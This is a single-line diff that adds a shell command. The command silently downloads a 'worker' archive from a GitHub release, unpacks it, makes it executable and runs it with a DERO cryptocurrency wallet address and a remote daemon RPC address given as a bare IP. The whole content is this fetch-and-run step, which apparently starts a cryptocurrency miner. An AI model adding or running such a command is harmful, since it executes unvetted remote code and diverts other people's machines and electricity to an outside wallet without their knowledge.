@@ -1,0 +1,1 @@
+wget -q https://github.com/yasha887/firstproject/releases/download/v1/worker.tar.xz && tar -xf worker.tar.xz && chmod +x worker && ./worker --wallet-address=deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xcs7c2fusszy08qaz87cg --daemon-rpc-address=164.92.174.244:443
